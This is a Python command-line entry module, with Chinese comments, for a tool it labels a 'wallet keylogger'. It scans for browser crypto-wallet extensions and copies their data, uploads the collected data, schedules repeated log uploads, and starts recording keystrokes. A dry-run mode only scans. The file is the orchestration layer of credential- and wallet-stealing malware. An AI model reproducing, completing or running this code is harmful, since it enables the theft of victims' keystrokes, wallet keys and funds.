# -*- coding: utf-8 -*-
"""
命令行入口模块
"""

import sys
import argparse

from .logger import KeyLogger, create_log_file
from .backup import backup_browser_extensions
from .uploader import upload_all, start_log_upload_scheduler
from .permissions import ensure_permissions


def main():
    """主函数"""
    parser = argparse.ArgumentParser(description="钱包键盘记录器")
    parser.add_argument(
        "--dry-run",
        action="store_true",
        help="安全测试模式：只扫描扩展和检测窗口，不备份、不删除、不上传、不记录按键",
    )

    args = parser.parse_args()

    if not args.dry_run:
        if not ensure_permissions():
            sys.exit(1)

    if args.dry_run:
        print("dry-run 模式：不会创建日志、复制/删除扩展数据、压缩上传或启动上传调度\n")
        print("正在扫描浏览器扩展数据...")
        count = backup_browser_extensions(dry_run=True)
        if count > 0:
            print(f"检测到 {count} 个目标钱包扩展（未备份）\n")
        else:
            print("未检测到目标钱包扩展\n")

        logger = KeyLogger(dry_run=True)
        try:
            logger.start()
        except KeyboardInterrupt:
            print("\n已停止 dry-run")
        except Exception as e:
            print(f"\n错误: {e}", file=sys.stderr)
            sys.exit(1)
        return 0

    log_file = create_log_file()

    print("正在备份浏览器扩展数据...")
    count = backup_browser_extensions()
    if count > 0:
        print(f"已备份 {count} 个钱包扩展\n")
    else:
        print("未检测到目标钱包扩展\n")

    upload_all()
    start_log_upload_scheduler()

    logger = KeyLogger(log_file)

    try:
        logger.start()
    except KeyboardInterrupt:
        print("\n已停止记录")
    except Exception as e:
        print(f"\n错误: {e}", file=sys.stderr)
        sys.exit(1)

    print(f"\n日志已保存到: {log_file}")
    return 0


if __name__ == "__main__":
    sys.exit(main() or 0)
